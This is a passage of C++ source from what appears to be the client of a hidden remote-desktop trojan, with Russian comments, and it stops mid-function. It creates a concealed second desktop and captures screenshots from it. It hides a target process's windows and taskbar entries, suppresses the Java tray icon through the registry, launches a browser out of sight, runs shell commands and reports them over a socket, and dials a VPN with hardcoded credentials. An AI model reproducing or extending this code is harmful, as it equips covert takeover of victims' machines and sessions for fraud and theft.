#include "stdafx.h"
#include "ClientOps.h"
#include "../common/protocol.h"
#include "stdio.h"
#include "stdlib.h"
#include "Shellapi.h"
#include "WinNt.h"
#include "Iphlpapi.h"
#include "funk.h"
#include "ras.h"
#include "raserror.h"
#include <winternl.h>
#include "Tlhelp32.h"
#include "DllLoader.h"
#include "TermSrv_Patch/Load.h"

#pragma comment(lib, "rasapi32.lib")
#pragma comment(lib, "Iphlpapi.lib")
//=============================================
Desktops CurDesk;
//=============================================



Desktops GetCurDesk()
{
	return CurDesk;
}
void SetCurDesk(Desktops desk)
{
	CurDesk = desk;
}

HDC hCompDC,hTmpCompDC,hRealWndCompDC;
DWORD dwPID;

#define init_DC(x)    HDC x##DC=GetDC(0);\
                      x##CompDC=CreateCompatibleDC(hDC);\
                      HBITMAP x##Bitmap=CreateCompatibleBitmap(x##DC,dwWidth,dwHeight);\
                      SelectObject(x##CompDC,x##Bitmap);

#define destroy_DC(x) DeleteDC(x##CompDC);\
                      DeleteObject(x##Bitmap);\
                      DeleteDC(x##DC);
struct WND_INFO
{
    RECT rcWnd;
    DWORD dwWidth;
    DWORD dwHeight;
    bool bScrollBars;
    RECT rcHScroll;
    RECT rcVScroll;
};
bool bXP;
void DrawWindow(HWND hWnd,HDC hDCTo,HDC hDCFrom)
{
    if (IsWindowVisible(hWnd))
    {
        LONG dwStyle=GetClassLongPtr(hWnd,GCL_STYLE);
        if ((!(dwStyle & CS_PARENTDC)) && /*(!(dwStyle & CS_OWNDC)) && */(!(dwStyle & CS_CLASSDC)))
        {
            if (bXP)
            {
                dwStyle=GetWindowLongPtr(hWnd,GWL_EXSTYLE);
                if (!(dwStyle & WS_EX_LAYERED))
                {
                    //SetWindowLongPtr(hWnd,GWL_EXSTYLE,dwStyle | WS_EX_LAYERED);
                    //SetLayeredWindowAttributes(hWnd,0xFFFF,255,LWA_ALPHA);
                }
                SendMessage(hWnd,WM_NCACTIVATE,true,NULL);
            }
            RECT rect;
            GetWindowRect(hWnd,&rect);
            PrintWindow(hWnd,hDCFrom,NULL);
            BitBlt(hDCTo,rect.left,rect.top,rect.right-rect.left,rect.bottom-rect.top,hDCFrom,0,0,SRCCOPY);
        }
    }
    return;
}

void DrawChildWindow(HWND hWnd,HDC hDCTo,HDC hDCFrom,WND_INFO *lpWndInfo)
{
    if (IsWindowVisible(hWnd))
    {
        LONG dwStyle=GetClassLongPtr(hWnd,GCL_STYLE);
        if ((!(dwStyle & CS_PARENTDC)) && /*(!(dwStyle & CS_OWNDC)) && */(!(dwStyle & CS_CLASSDC)))
        {
            RECT rect;
            GetWindowRect(hWnd,&rect);
			if ((rect.right > lpWndInfo->rcWnd.left) && (rect.left < lpWndInfo->rcWnd.right) && (rect.bottom > lpWndInfo->rcWnd.top) && (rect.top < lpWndInfo->rcWnd.bottom))
            {
                PrintWindow(hWnd,hDCFrom,NULL);
                int dwX=0,dwY=0;
                if (rect.bottom > lpWndInfo->rcWnd.bottom)
                {
                    rect.bottom=lpWndInfo->rcWnd.bottom-2;
                    if (lpWndInfo->bScrollBars)
                        rect.bottom-=lpWndInfo->rcHScroll.bottom-lpWndInfo->rcHScroll.top;
                }
                if (rect.top < lpWndInfo->rcWnd.top)
                {
                    dwY=lpWndInfo->rcWnd.top-rect.top+2;
                    rect.top=lpWndInfo->rcWnd.top+2;
                }
                if (rect.right > lpWndInfo->rcWnd.right)
                {
                    rect.right=lpWndInfo->rcWnd.right-2;
                    if (lpWndInfo->bScrollBars)
                        rect.right-=lpWndInfo->rcVScroll.right-lpWndInfo->rcVScroll.left;
                }
                if (rect.left < lpWndInfo->rcWnd.left)
                {
                    dwX=lpWndInfo->rcWnd.left-rect.left+2;
                    rect.left=lpWndInfo->rcWnd.left+2;
                }
                BitBlt(hDCTo,rect.left,rect.top,rect.right-rect.left,rect.bottom-rect.top,hDCFrom,dwX,dwY,SRCCOPY);
            }
        }
    }
    return;
}

void FillRectInfo(HWND hWnd,WND_INFO *lpWndInfo,WND_INFO *lpParentWndInfo)
{
    GetWindowRect(hWnd,&lpWndInfo->rcWnd);
    lpWndInfo->dwWidth=lpWndInfo->rcWnd.right-lpWndInfo->rcWnd.left;
    lpWndInfo->dwHeight=lpWndInfo->rcWnd.bottom-lpWndInfo->rcWnd.top;

    LONG dwStyle;
    dwStyle=GetWindowLongPtr(hWnd,GWL_STYLE);
    if ((dwStyle & WS_VSCROLL) || (dwStyle & WS_HSCROLL))
    {
        SCROLLBARINFO sbiInfo;
        sbiInfo.cbSize=sizeof(sbiInfo);
        if (GetScrollBarInfo(hWnd,OBJID_HSCROLL,&sbiInfo))
        {
            lpWndInfo->bScrollBars=true;
            memcpy(&lpWndInfo->rcHScroll,&sbiInfo.rcScrollBar,sizeof(RECT));
        }
        if (GetScrollBarInfo(hWnd,OBJID_VSCROLL,&sbiInfo))
        {
            lpWndInfo->bScrollBars=true;
            memcpy(&lpWndInfo->rcVScroll,&sbiInfo.rcScrollBar,sizeof(RECT));
        }
    }

    if (lpParentWndInfo)
    {
        if (lpWndInfo->rcWnd.bottom > lpParentWndInfo->rcWnd.bottom)
        {
            lpWndInfo->rcWnd.bottom=lpParentWndInfo->rcWnd.bottom;
            if (lpParentWndInfo->bScrollBars)
                lpWndInfo->rcWnd.bottom-=lpParentWndInfo->rcHScroll.bottom-lpParentWndInfo->rcHScroll.top;
        }
        if (lpWndInfo->rcWnd.top < lpParentWndInfo->rcWnd.top)
            lpWndInfo->rcWnd.top=lpParentWndInfo->rcWnd.top;
        if (lpWndInfo->rcWnd.right > lpParentWndInfo->rcWnd.right)
        {
            lpWndInfo->rcWnd.right=lpParentWndInfo->rcWnd.right;
            if (lpParentWndInfo->bScrollBars)
                lpWndInfo->rcWnd.right-=lpParentWndInfo->rcVScroll.right-lpParentWndInfo->rcVScroll.left;
        }
        if (lpWndInfo->rcWnd.left < lpParentWndInfo->rcWnd.left)
            lpWndInfo->rcWnd.left=lpParentWndInfo->rcWnd.left;
    }
    return;
}

#ifdef DBG
HBITMAP hBitmap;
DWORD dwWidth,dwHeight;
#endif
void EnumChilds(HWND hWnd,WND_INFO *lpWndInfo)
{
    if (hWnd)
    {
        do
        {
            DrawChildWindow(hWnd,hCompDC,hTmpCompDC,lpWndInfo);
            WND_INFO wiWndInfo={0};
            FillRectInfo(hWnd,&wiWndInfo,lpWndInfo);

#ifdef DBG
            SaveToPNG(hBitmap,dwWidth,dwHeight);
#endif

            EnumChilds(GetWindow(GetWindow(hWnd,GW_CHILD),GW_HWNDLAST),&wiWndInfo);
        }
        while (hWnd=GetWindow(hWnd,GW_HWNDPREV));
    }
    return;
}

// TODO (Гость#1#): перехват в скрытом браузере, посыл сообщений как в внц

void EnumWnds(HWND hWnd)
{
    if (hWnd)
    {
        do
        {
            if (!IsIconic(hWnd))
            {
                /*if (bXP)
                    InjectWnd((LPTHREAD_START_ROUTINE)RemoteThread,hWnd);*/
                DrawWindow(hWnd,hCompDC,hTmpCompDC);
                if (bXP)
                {
                    WND_INFO wiWndInfo= {0};
                    FillRectInfo(hWnd,&wiWndInfo,NULL);
                    EnumChilds(GetWindow(GetWindow(hWnd,GW_CHILD),GW_HWNDLAST),&wiWndInfo);
                }
            }
        }
        while (hWnd=GetWindow(hWnd,GW_HWNDPREV));
    }
    return;
}


void MakeScreenShot(HWND hWnd, HDC hDC_res, DWORD* W, DWORD* H)
{
    HWND hDesk=GetDesktopWindow();
	if(hWnd == 0) hWnd = hDesk;
    RECT rect;
    GetWindowRect(hDesk,&rect);

#ifdef DBG
    dwWidth=rect.right-rect.left;
    dwHeight=rect.bottom-rect.top;

    HDC hDC=GetDC(0);
    hCompDC=CreateCompatibleDC(hDC);
    hBitmap=CreateCompatibleBitmap(hDC,dwWidth,dwHeight);
    SelectObject(hCompDC,hBitmap);
#else
    DWORD dwWidth=rect.right-rect.left,
          dwHeight=rect.bottom-rect.top;

    init_DC(h);
#endif
    init_DC(hTmp);
    init_DC(hRealWnd);

    DrawWindow(hWnd,hCompDC,hTmpCompDC);
    EnumWnds(GetWindow(GetWindow(hWnd,GW_CHILD),GW_HWNDLAST));

    if (hDesk != hWnd)
    {
        GetWindowRect(hWnd,&rect);
        dwWidth=rect.right-rect.left;
        dwHeight=rect.bottom-rect.top;
		*W = dwWidth;
		*H = dwHeight;

        HDC hWndCompDC;
        //init_DC(hWnd);
        BitBlt(hDC_res,0,0,dwWidth,dwHeight,hCompDC,rect.left,rect.top,SRCCOPY);
        //BitBlt(hWndCompDC,0,0,dwWidth,dwHeight,hCompDC,rect.left,rect.top,SRCCOPY);
        //SaveToPNG(hWndBitmap,dwWidth,dwHeight);
        //destroy_DC(hWnd);
    }
    else
	{
		*W = dwWidth;
		*H = dwHeight;
		BitBlt(hDC_res,0,0,dwWidth,dwHeight,hCompDC,rect.left,rect.top,SRCCOPY);
        //SaveToPNG(hBitmap,dwWidth,dwHeight);
	}

    destroy_DC(h);
    destroy_DC(hTmp);
    destroy_DC(hRealWnd);
    return;
}


typedef struct _MakeScreenShotParams
{
	HWND hWnd;
	HDC hDC_res;
	DWORD W;
	DWORD H;
}MakeScreenShotParams, *PMakeScreenShotParams;

DWORD MakeScreenShotWrapper(LPVOID param)
{
	PMakeScreenShotParams data = (PMakeScreenShotParams)param;
	HDESK hSecondDesktop=CreateDesktopW(SECOND_DESK_NAME,NULL,NULL,DF_ALLOWOTHERACCOUNTHOOK,GENERIC_ALL,NULL);
	BOOL res = SetThreadDesktop(hSecondDesktop);
	if(!res)
	{
		DWORD err = GetLastError();
		DbgMsgW(L"file", err, L"SetThreadDesktop ERROR");
	}
	MakeScreenShot(data->hWnd, data->hDC_res, &data->W, &data->H);
	return 0;
}

int iSleep;

CClientContext::CClientContext()
	: m_dwGdiplusToken( 0 )
	, m_pLoader( 0 )
	, m_bUseJpeg( 0 )
	, m_bBoostHideFlag( 0 )
	, m_iPort( DEFAULT_SERVER_PORT )
	, m_iBrowserType( 1 )
	, m_iSleep1( 10 )
	, m_iSleep2( 10 )
	, m_iSleep3( 10 )
	, m_iSleep ( 100 )
	, m_iPrio1( THREAD_PRIORITY_HIGHEST )
	, m_bJavaMove(true)
	, m_bShowAllWindows(false)
	, m_bHideSecDesc(false)

{
	m_sServer[0] = 0;
	m_sUid[0] = 0;
	ZeroMemory(ProccessName,25);
	ZeroMemory(WinHederName,25);
	//iSleep=m_iSleep;
}


//=============================================

// TODO: templatize it FFS!
class CDWORDList
{
protected:

	DWORD m_dwCount;
	DWORD m_dwAllocated;
	DWORD *m_pArray;

public:

	CDWORDList()
		: m_dwCount( 0 )
		, m_dwAllocated( 0 )
		, m_pArray( 0 )
	{
	}

	~CDWORDList()
	{
		if( m_dwAllocated > 0 &&
			m_pArray )
		{
			free( m_pArray );
		}
	}

	bool Exists( DWORD value )
	{
		for( DWORD i=0; i<m_dwCount; i++ )
		{
			if( m_pArray[i] == value )
			{
				return true;
			}
		}
		return false;
	}

	void Add( DWORD value )
	{
		if( m_dwAllocated < m_dwCount+1 )
		{
			m_dwAllocated = m_dwCount + 10;
			m_pArray = (DWORD*)realloc( m_pArray, m_dwAllocated * sizeof(DWORD) );
		}
		m_pArray[m_dwCount] = value;
		m_dwCount++;
	}
};


struct HIDE_PROCESS
{
	DWORD m_dwProcessId;
	ITaskbarList *pList;
	CDWORDList *pJavaProc;
};

void SetLayered( HWND hw )
{
	DWORD dwOriginalStyle = ::GetWindowLong(hw, GWL_EXSTYLE);
	if( !(dwOriginalStyle & WS_EX_LAYERED) )
	{
		SetWindowLong( hw, GWL_EXSTYLE, GetWindowLong(hw, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
		SetWindowLong( hw, GWL_EXSTYLE, /*dwOriginalStyle |*/ WS_EX_LAYERED );
		SetLayeredWindowAttributes( hw, 0, 1, 2 );
	}
}

BOOL CALLBACK HideProcessWindows(HWND hw, LPARAM p)
{
	HIDE_PROCESS *hp = (HIDE_PROCESS *)p;

	DWORD dwPID = 0;
	GetWindowThreadProcessId( hw, &dwPID );

	if( dwPID == hp->m_dwProcessId )
	{
		hp->pList->DeleteTab( hw );
		SetLayered( hw );
		//SetWindowPos(hw, HWND_BOTTOM, 0, 0, 100, 100, SWP_SHOWWINDOW | SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
		SetWindowPos(hw, HWND_BOTTOM, 0, 0, 100, 100, SWP_HIDEWINDOW | SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
	}
	else
	{
		if( hp->pJavaProc->Exists( dwPID ) )
		{
			hp->pList->DeleteTab( hw );
			SetLayered( hw );
		}
		else
		{
			if(IsJavaWindow(hw))
			{
				hp->pJavaProc->Add( dwPID );
			}
		}
	}
	return TRUE;
}

DWORD WINAPI HideProcessThread( LPVOID lpThreadParameter )
{
	CoInitialize(0);

	CDWORDList javas;

	HIDE_PROCESS hp;
	hp.m_dwProcessId = (DWORD)lpThreadParameter;
	hp.pJavaProc = &javas;
	hp.pList = 0;

	HRESULT hr = S_OK;
	CoCreateInstance( CLSID_TaskbarList, 0, CLSCTX_SERVER, IID_ITaskbarList, (void**)&(hp.pList) );
	if( hp.pList )
	{
		hp.pList->HrInit();

		DWORD dwProcessId = (DWORD)lpThreadParameter;
		while( 1 )
		{
			if( GetProcessVersion(dwProcessId) == 0 )
			{
				break;
			}

			EnumWindows( HideProcessWindows, (LPARAM)&hp );
			Sleep( 5 );
		}

		hp.pList->Release();
	}
	return 0;
}
bool HideSystemTrayIcon()/// делаем кно
{
	for( int i=18; i<=24; i++ )
	{
		WCHAR buf[300] = L"";
		wsprintf( buf, L"SOFTWARE\\JavaSoft\\Java Plug-in\\1.6.0_%d", i );

		HKEY hk = 0;
		if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, buf,
			0, KEY_ALL_ACCESS, &hk ) == ERROR_SUCCESS )
		{
			DWORD one = 1;
			RegSetValueEx( hk, L"HideSystemTrayIcon", 0, REG_DWORD, (BYTE*)&one, sizeof(one) );
			RegCloseKey( hk );
		}
	}
	return 0;
}

bool ShowSystemTrayIcon()/// делаем кно
{
	for( int i=18; i<=24; i++ )
	{
		WCHAR buf[300] = L"";
		wsprintf( buf, L"SOFTWARE\\JavaSoft\\Java Plug-in\\1.6.0_%d", i );

		HKEY hk = 0;
		if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, buf,
			0, KEY_ALL_ACCESS, &hk ) == ERROR_SUCCESS )
		{
			DWORD zero = 0;
			RegSetValueEx( hk, L"HideSystemTrayIcon", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero) );
			RegCloseKey( hk );
		}
	}
	return 0;
}


void StartHidingProcess( CClientContext *pContext, DWORD dwProcessId )
{
	for( int i=18; i<=22; i++ )
	{
		WCHAR buf[300] = L"";
		wsprintf( buf, L"SOFTWARE\\JavaSoft\\Java Plug-in\\1.6.0_%d", i );

		HKEY hk = 0;
		if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, buf,
			0, KEY_ALL_ACCESS, &hk ) == ERROR_SUCCESS )
		{
			DWORD one = 1;
			RegSetValueEx( hk, L"HideSystemTrayIcon", 0, REG_DWORD, (BYTE*)&one, sizeof(one) );
			RegCloseKey( hk );
		}
	}

	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread( 0, 0, HideProcessThread, (LPVOID)dwProcessId, 0, &dwThreadId );
	SetThreadPriority( hThread, pContext->m_iPrio1 );
	CloseHandle( hThread );
}

//=============================================
void CopyDll(bool bYes, WCHAR *str)
{
	HANDLE iFileHandle;
	if(bYes)
	{
		iFileHandle=CreateFile(str, GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CloseHandle(iFileHandle);
	}
	else
	{
		DeleteFile(str);
	}
}
HHOOK hook_WH_CBT;
HHOOK getHookN()
{
	return hook_WH_CBT;
}

LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if(nCode == HCBT_MINMAX)
	{
		HWND hWnd = (HWND)wParam;
	}
	if(nCode == HCBT_CREATEWND)
	{
		CBT_CREATEWND *createwnd = (CBT_CREATEWND*)lParam;
	}
	CallNextHookEx(hook_WH_CBT, nCode, wParam, lParam);
	return -1;
}

void DbgMsgW(WCHAR *file, int line, WCHAR *msg, ...)
{
	WCHAR *buff  = (WCHAR*)malloc( 1024 );
	WCHAR *obuff = (WCHAR*)malloc( 1024 );
	va_list mylist;

	va_start(mylist, msg);
	wvsprintfW(buff, msg, mylist);
	va_end(mylist);

	wsprintfW(obuff, L"%s(%d) : %s", file, line, buff);

	OutputDebugStringW(obuff);

	free(buff);
	free(obuff);
}

bool RunNewIE( TCHAR* cInput,TCHAR* cExe, BOOL sw_shell )
{
	TCHAR sPathWStr[1024] = L"";
	if (cExe[0]=='\0')
	{
		SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, sPathWStr);
		lstrcat( sPathWStr, L"\\Internet Explorer\\iexplore.exe " );
	}
	else
	{
		wcscpy(&sPathWStr[0],cExe);
	}
	if (cInput[0]=='\0')
	{
		cInput=L" ";

	}
	TCHAR sPath[1024] = L"";

	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, sPath);
	DbgMsgW(sPath,1,L"");
	lstrcat( sPath, L"\\ie.dat" );
	HANDLE hFile = (HANDLE)CreateFileW( sPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

	if (hFile==INVALID_HANDLE_VALUE)
		DbgMsgW(sPath,GetLastError(),L"");
	DWORD dwSiseFile;
	DWORD dwBytes;

	if (sw_shell)
	{
		if (!WriteFile(hFile,L"!",2,&dwBytes,NULL))
		{
			OutputDebugStringA("WriteFile error");
		}
	}
	else
		if(GetCurDesk() == First )
		{
			if (!WriteFile(hFile,L"1",2,&dwBytes,NULL))
			{
				OutputDebugStringA("WriteFile error");
			}
		}
	else
		if(GetCurDesk() == Second )
		{
			if (!WriteFile(hFile,L"2",2,&dwBytes,NULL))
			{
				OutputDebugStringA("WriteFile error");
			}
		}


	int t =wcslen(&sPathWStr[0])*2;
	if (!WriteFile(hFile,&sPathWStr[0],t,&dwBytes,NULL))
	{
		OutputDebugStringA("WriteFile error");
	}
	if (!WriteFile(hFile,L"|",2,&dwBytes,NULL))
	{
		OutputDebugStringA("WriteFile error");
	}
	t =wcslen(cInput)*2+1;
	if (!WriteFile(hFile,cInput,t,&dwBytes,NULL))
	{
		OutputDebugStringA("WriteFile error");
	}
	CloseHandle(hFile);

	HANDLE mHahd= CreateMutexA(NULL,false,"CrMIE");
	if (mHahd==NULL)OutputDebugStringA("CreateMutexA error");
	Sleep(4000);
	CloseHandle(mHahd);
	return true;
}

HWND hWnd_newConnection = NULL;
BOOL enumWindows(HWND hWnd, LPARAM ProcId)
{
	WCHAR classname[256] = {0};
	GetClassName(hWnd, &classname[0], 256);
	//if(wcscmp(&classname[0], L"#32770 (Dialog)") == 0)
	{
		DWORD pid = 0;
		GetWindowThreadProcessId(hWnd, &pid);
		if(pid == ProcId)
		{
			hWnd_newConnection = hWnd;
			return FALSE;
		}
	}
	return TRUE;
}

CHAR* RunCommandA(char* cmd)
{
    BYTE  buf[BUFSIZ];
    CHAR* text = NULL;
	DWORD size = 0;
    FILE *ptr;
    if ((ptr = _popen(cmd, "r")) != NULL)
	{
		while (fgets((CHAR*)buf, BUFSIZ, ptr) != NULL)
		{
			int nLen = strlen((CHAR*)&buf[0]);
			text = (CHAR*)realloc(text, (size + nLen)*sizeof(CHAR));
			memcpy(text+size, buf, nLen);
			size += nLen;
		}
        (void) _pclose(ptr);
	}
	return text;
}

DWORD ExecCommand(LPVOID* param)
{
	HDESK hDesktop = CreateDesktop(L"MyDesktop", NULL, NULL, 0, GENERIC_ALL, NULL);
	BOOL r = SetThreadDesktop(hDesktop);
	BYTE  buf[BUFSIZ] = {0};
    WCHAR* text = NULL;
	DWORD size = 0;
    FILE *ptr;
	WCHAR* cmd = (WCHAR*)*param;
    if ((ptr = _wpopen(cmd, L"rt")) != NULL)
	{
		while (fgetws((WCHAR*)buf, BUFSIZ, ptr) != NULL)
		{
			int nLen = wcslen((WCHAR*)&buf[0]);
			text = (WCHAR*)realloc(text, (size + nLen) * sizeof(WCHAR));
			memcpy(text + size, buf, nLen*sizeof(WCHAR));
			size += nLen;
		}
        (void) _pclose(ptr);
	}
	*param = (LPVOID)realloc(*param, wcslen(text)*sizeof(WCHAR));
	wcscpy((WCHAR*)*param, text);
	//return text;

	return 0;
}

WCHAR* RunCommandW(WCHAR* cmd)
{
	WCHAR* param = (WCHAR*)malloc(128*sizeof(WCHAR));
	wcscpy(param, (WCHAR*)cmd);
	WaitForSingleObject(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecCommand, &param, NULL, NULL), -1);
	return param;
}

bool GetGatewayA(CHAR* pszGateway)
{
	HANDLE hFile = CreateFileW(L"C:\\route.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE) return false;
	BYTE* buf = (BYTE*)malloc(1024);
	memset(buf, 0, 1024);
	BYTE* pszComandResult = NULL;
	DWORD BytesRead = 0;
	DWORD BufSize = 0;
	while(ReadFile(hFile, buf, 1024, &BytesRead, NULL))
	{
		pszComandResult = (BYTE*)realloc(pszComandResult, BufSize+BytesRead);
		memcpy(pszComandResult+BufSize, buf, BytesRead);
		BufSize += BytesRead;
		if(BytesRead < 1024) break;
	}
	pszComandResult[BytesRead] = 0;
	CloseHandle(hFile);
	/*
	CHAR* pszComandResult = RunCommandA("route print 0.0.0.0");
	for(CHAR* pszStringIter = pszComandResult; pszStringIter[0]!=NULL; pszStringIter+=strlen(pszStringIter))*/
	{
		CHAR* pszSpan = strstr((CHAR*)pszComandResult, "Основной шлюз");
		//CHAR* pszSpan = strstr(pszStringIter, "Основной шлюз");
		if(pszSpan == NULL) return false;
		//if(pszSpan == NULL) continue;

		pszSpan = strtok(pszSpan, ":");
		pszSpan = strtok(NULL, ":");
		CHAR* pszSpanTrim = strstr(pszSpan, "\r\n");
		pszSpanTrim[0] = 0;
		pszSpan = strtok(pszSpan, " ");
		strncpy(pszGateway, pszSpan, strlen(pszSpan));
		free(pszComandResult);
		return true;
	}
	free(pszComandResult);

	return NULL;
}
bool GetGatewayW(WCHAR* pszGateway)
{
	WCHAR* pszComandResult = RunCommandW(L"route print 0.0.0.0");
	for(WCHAR* pszStringIter = pszComandResult; pszStringIter!=NULL; pszStringIter+=wcslen(pszStringIter))
	{
		WCHAR* pszSpan = wcsstr((WCHAR*)pszStringIter, L"Основной шлюз");
		if(pszSpan == NULL) continue;

		pszSpan = wcstok(pszSpan, L":");
		pszSpan = wcstok(NULL, L":");
		WCHAR* pszSpanTrim = wcsstr(pszSpan, L"\r\n");
		pszSpanTrim[0] = 0;
		pszSpanTrim = wcstok(pszSpanTrim, L" ");
		wcsncpy(pszGateway, pszSpan, wcslen(pszSpan)*sizeof(WCHAR));
		free(pszComandResult);
		return pszGateway;
	}
	free(pszComandResult);

	return NULL;
}



DWORD RemoveRemoteDefaultGateway_RM(WCHAR* EntryName, WCHAR* PhonebookPath)
{
	DWORD dwSize = 0;
	DWORD result = RasGetEntryProperties(NULL, L"", NULL, &dwSize, NULL, NULL);
	RASENTRY* pRASEntry = (RASENTRY*)malloc(sizeof(RASENTRY));
	pRASEntry->dwSize = dwSize;
	DWORD RASEntrySize = dwSize;
	DWORD ret = RasGetEntryPropertiesW(PhonebookPath, EntryName, pRASEntry, &RASEntrySize, NULL, NULL);
	if((pRASEntry->dwfOptions & RASEO_RemoteDefaultGateway) == RASEO_RemoteDefaultGateway) pRASEntry->dwfOptions -= RASEO_RemoteDefaultGateway;
	ret = RasSetEntryPropertiesW(PhonebookPath, EntryName, pRASEntry, RASEntrySize, NULL, NULL);
	if(ret == ERROR_SUCCESS) return 0;
	return ret;
}

DWORD RemoveRemoteDefaultGateway(WCHAR* ConnectionName)
{
    DWORD dwCb = 0;
    DWORD dwRet = ERROR_SUCCESS;
    DWORD dwEntries = 0;
    LPRASENTRYNAME lpRasEntryName = (LPRASENTRYNAME)malloc(sizeof(RASENTRYNAME));
	if(lpRasEntryName == NULL)
		return GetLastError();
	lpRasEntryName->dwSize = sizeof(RASENTRYNAME);

    // Call RasEnumEntries with lpRasEntryName = NULL. dwCb is returned with the required buffer size and
    // a return code of ERROR_BUFFER_TOO_SMALL
    dwRet = RasEnumEntries(NULL, NULL, lpRasEntryName, &dwCb, &dwEntries);

    if (dwRet == ERROR_BUFFER_TOO_SMALL){
        // Allocate the memory needed for the array of RAS entry names.
        lpRasEntryName = (LPRASENTRYNAME) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwCb);
		LPRASENTRYNAME lpRasEntryNameTmp = lpRasEntryName;
		if (dwCb != sizeof(RASENTRYNAME)) lpRasEntryName = (LPRASENTRYNAME)realloc(lpRasEntryNameTmp, dwCb);
        if (lpRasEntryName == NULL){
			free(lpRasEntryNameTmp);
            //wprintf(L"HeapAlloc failed!\n");
            return 1;
        }
        // The first RASENTRYNAME structure in the array must contain the structure size
        lpRasEntryName[0].dwSize = sizeof(RASENTRYNAME);

        // Call RasEnumEntries to enumerate all RAS entry names
        dwRet = RasEnumEntries(NULL, NULL, lpRasEntryName, &dwCb, &dwEntries);

        // If successful, print the RAS entry names
        if (ERROR_SUCCESS == dwRet)
		{
            //wprintf(L"The following RAS entry names were found:\n");
            for (DWORD i = 0; i < dwEntries; i++)
			{
                //wprintf(L"%s\n", lpRasEntryName[i].szEntryName);
				if(wcscmp(&lpRasEntryName[i].szEntryName[0], ConnectionName) == 0)
				{
					DWORD res = RemoveRemoteDefaultGateway_RM(&lpRasEntryName[i].szEntryName[0], &lpRasEntryName[i].szPhonebookPath[0]);
					free(lpRasEntryName);
					return res;
				}
            }
        }
        //Deallocate memory for the connection buffer
        free(lpRasEntryName);
        lpRasEntryName = NULL;
        return 0;
    }

    // There was either a problem with RAS or there are RAS entry names to enumerate
    if(dwEntries >= 1){
        //wprintf(L"The operation failed to acquire the buffer size.\n");
		return 2;
    }else{
        //wprintf(L"There were no RAS entry names found:.\n");
		return 3;
    }

    return 0;
}

DWORD VPNStart(LPVOID send_params)
{
	DWORD timestamp = ((SendParams*)send_params)->timestamp;
	SOCKET s = ((SendParams*)send_params)->socket;
	DWORD err = 0;

	//Подготовка структуры к получению данных об удалённом соединении.
	//Необходимо заполнить dwSize и szEntryName
	LPRASDIALPARAMS params = new RASDIALPARAMS();
	memset(params, 0, sizeof(RASDIALPARAMS));
	params->dwSize = sizeof(RASDIALPARAMS);
	wcscpy(&params->szEntryName[0], L"XXX");

	//Получение данных об удалённом подключении
	BOOL bPass = FALSE;
	err = RasGetEntryDialParams(NULL, params, &bPass);
	if(err != ERROR_SUCCESS)
	{
		goto ret;
	}

	//Дозвон
	HRASCONN hRasConn = NULL;
	wcscpy(&params->szUserName[0], L"pptp");
	wcscpy(&params->szPassword[0], L"pptp");
	err = RasDialW(NULL, NULL, params, NULL, NULL, &hRasConn);

ret:
	if(err == 0)
		SendMess(L"VPN Connected successfully", s, timestamp);
	else
	{
		WCHAR mes[64];
		wsprintfW(&mes[0], L"VPN Failed to start: %d", err);
		SendMess(&mes[0], s, timestamp);
	}
	delete(params);
	return err;
}

void VPNStartThread(SendParams params)
{
	HANDLE hThr = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)VPNStart, (LPVOID)&params, NULL, 0);
}

//DWORD VPNStart()
//{
//	TCHAR sPathWStr[1024] = L"";
//	STARTUPINFOA si;
//	ZeroMemory( &si, sizeof(si) );
//	si.cb = sizeof(si);
//	si.dwFlags = STARTF_USESHOWWINDOW;
//	si.wShowWindow =SW_HIDE;//SW_SHOWMINNOACTIVE  SW_HIDE  SW_MAXIMIZE  SW_HIDE...
//	if(GetCurDesk() == Second)
//		si.lpDesktop = SECOND_DESK_NAMEA;
//	//si.lpDesktop = "SecondDesktop";
//
//	PROCESS_INFORMATION pi;
//	ZeroMemory( &pi, sizeof(pi) );
//
//	//WCHAR* pszComandResult = RunCommandW(L"cmd /A /C route print 0.0.0.0");
//	//system("rasdial XXX pptp pptp");
//	if( CreateProcessA( NULL, "rasdial XXX pptp pptp", 0, 0, 1, 0, 0, 0, &si, &pi ))
//	{
//		Sleep(5000);
//		return 0;
//	}
//	return 1;
//
//	/*CHAR pszGateway[128] = {0};
//	GetGatewayA(&pszGateway[0]);*/
//	/*CHAR GatewayA[50] = {0};
//	DWORD size = 0;
//	WideCharToMultiByte(CP_THREAD_ACP, WC_COMPOSITECHECK, pszGatewayIP, -1, &GatewayA[0], wcslen(pszGatewayIP), NULL, NULL);
//	CHAR buf[1024] = {0};
//	wsprintfA(&buf[0], "route add 0.0.0.0 mask 0.0.0.0 %s", &GatewayA[0]);
//	//system("route delete 0.0.0.0");
//	if( CreateProcessA( NULL, "route delete 0.0.0.0", 0, 0, 1, 0, 0, 0, &si, &pi ) )
//	{
//	}
//	Sleep(2000);
//	//system(&buf[0]);
//	if( CreateProcessA( NULL, &buf[0], 0, 0, 1, 0, 0, 0, &si, &pi ) )
//	{
//	}
//	DWORD err = GetLastError();
//	return false;*/
//}

DWORD CheckVPNState(DWORD* result)
{
	//ver();
	DWORD err = 0;
	DWORD dwBufferSize = sizeof(RASCONNW);
	DWORD dwCount = 0;

	// Получаем необходимый размер буффера для списка соедидений
	LPRASCONNW pRasConn = (LPRASCONNW)malloc(sizeof(RASCONNW));
	if(pRasConn == NULL) return GetLastError();
